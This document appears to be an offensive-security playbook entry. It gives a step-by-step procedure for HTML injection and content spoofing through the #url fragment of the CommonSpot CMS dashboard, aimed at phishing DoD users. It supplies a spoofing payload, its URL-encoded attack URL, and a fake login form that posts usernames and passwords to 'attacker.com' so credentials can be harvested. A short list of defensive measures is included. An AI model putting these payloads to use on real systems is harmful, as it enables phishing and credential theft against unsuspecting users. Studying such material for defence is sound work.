---
tags:
  - html-injection
  - content-spoofing
  - phishing
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7a34b0d1-e49c-4947-a3c4-6dde06908026
created_at: '2025-12-14T03:16:02.564Z'
updated_at: '2025-12-14T03:16:02.564Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-HTML-Tags-for-Content-Spoofing-via-URL

## Summary

This procedure injects unsanitized HTML tags into the #url parameter of the CommonSpot CMS dashboard, allowing attackers to spoof content and create deceptive elements like fake login prompts for credential theft.

## Description

The CMS fails to escape HTML in URL fragments, permitting tags such as <center><img> and <font> to render directly. Injected payloads alter the page appearance, enabling phishing attacks on DoD users by mimicking legitimate forms.

## Requirements

1. Dashboard endpoint accessibility
2. Knowledge of HTML tags for visual manipulation
3. Encoding tool for special characters in fragments

## Defense

Defensive measures and detection strategies:

- Sanitize all URL fragments by converting to text or stripping tags
- Use HTML parsers like DOMPurify for safe rendering
- Implement client-side validation to reject malformed fragments
- Detect unusual HTML in logs via pattern matching

## Objectives

1. Render custom HTML to deceive users
2. Spoof interfaces for phishing credentials
3. Alter page layout for social engineering

## Instructions

### Step 1: Design HTML Payload

**Context**: Build a simple spoofing payload with centering and styling.

Payload: <center><img src="███"/><center><center><br><font color="red" size="10">HTML INJECTION!</font></center>

Encoded: a;%3Ccenter%3E%3Cimg%20src=%22███%22/%3E%3C/center%3E%3Ccenter%3E%3Ccenter%3E%3Cbr%3E%3Cfont%20color=%22red%22%20size=%2210%22%3EHTML%20INJECTION!%3C/font%3E%3C/center%3E

### Step 2: Inject and Render

**Context**: Append to #url and load the page.

Full URL: [redacted]commonspot/dashboard/index.html#url=a;%3Ccenter%3E%3Cimg%20src=%22███%22/%3E%3C/center%3E%3Ccenter%3E%3Ccenter%3E%3Cbr%3E%3Cfont%20color=%22red%22%20size=%2210%22%3EHTML%20INJECTION!%3C/font%3E%3C/center%3E

> Observe rendered text and broken image on the dashboard.

### Step 3: Enhance for Phishing

**Context**: Extend to include form elements.

Add: <form action="http://attacker.com"><input type="text" placeholder="Username"><input type="password" placeholder="Password"><input type="submit"></form>

> Expected: Functional fake login form submission to attacker.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[html-injection]]
- [[Phishing]]
